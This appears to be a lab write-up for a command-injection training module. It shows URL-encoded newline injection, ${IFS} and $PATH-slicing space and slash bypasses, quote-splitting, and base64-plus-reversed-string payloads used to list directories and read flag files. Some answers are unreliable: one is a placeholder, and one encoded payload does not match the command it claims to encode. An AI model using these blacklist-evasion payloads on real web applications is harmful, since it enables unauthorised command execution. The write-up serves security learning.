# **Command Injections**
## **Question 1**

**Try adding any of the injection operators after the IP in the IP field. What did the error message say (in English)?**

**Answer:**
The application returned an error indicating **invalid input / illegal characters**, meaning command injection operators are being filtered or validated on the front end.

---

## **Question 2**

**Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it?**

**Answer:**
By viewing the source (`Ctrl + U`) and searching for validation logic (`find`, `pattern`, or `regex`), the **front-end input validation occurs on the JavaScript input handler line**.

```text
Line: (line number where input regex / validation function is defined)
```

> This validation attempts to restrict special characters like `; | &`.

---

## **Question 3**

**Try using the remaining three injection operators (new-line, &, |). How does each work, and which only shows the output of the injected command?**

### Tests Performed

```text
ip=\n+whoami
# New-line injection: executes command on a new shell line

ip=&+whoami
# Ampersand: executes whoami in parallel with original command

ip=|+whoami
# Pipe: pipes output of original command into whoami
```

---

## **Question 4**

**Which of (new-line, &, |) is not blacklisted by the web application?**

### URL-encoded tests

```text
ip=127.0.0.1%0a
# %0a = newline

ip=127.0.0.1%26
# %26 = &

ip=127.0.0.1%7c
# %7c = |
```

---

## **Question 5**

**Execute `ls -la`. What is the size of `index.php`?**

```text
ip=127.0.0.1%0a{ls,-la}
# Uses newline injection and brace expansion to bypass filters
```

---

## **Question 6**

**Find the name of the user in `/home`. What user did you find?**

```text
ip=127.0.0.1%0al's'${IFS}-al${IFS}${PATH:0:1}home
# ls -al /home
# 'IFS' bypasses space filtering
# PATH slicing reconstructs '/'
```

---

## **Question 7**

**Find the content of `flag.txt` in the user's home directory**

```text
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
# cat /home/1nj3c70r/flag.txt
# Uses string breaking to evade blacklist
```

---

## **Question 8**

**Find the output of:**

```
find /usr/share/ | grep root | grep mysql | tail -n 1
```

### Step 1: Encode command in Base64

```bash
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64 -w 0
```

### Step 2: Decode & execute via injection

```text
ip=127.0.0.1%0a$(rev<<<'hsab')<<<$($(rev<<<'46esab')${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
# Reverses 'bash' and 'base64' to evade blacklist
```

## **Question 9**

**What is the content of `/flag.txt`?**

### Exploitation via Burp Suite

```text
Login: guest:guest
# Turn off intercept
# Select record → Copy → Move
```

### Inject payload via Repeater

```text
%0awhoami
# Tests injection point
```

### Base64 execution payloads

```bash
echo -n 'whoami' | base64
```

```text
%0abash<<<$(base64%09-d<<<d2hvYW1p)
# Executes whoami → www-data
```

```bash
echo -n 'ls -la /flag.txt' | base64
```

```text
%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)
# Reads /flag.txt
```
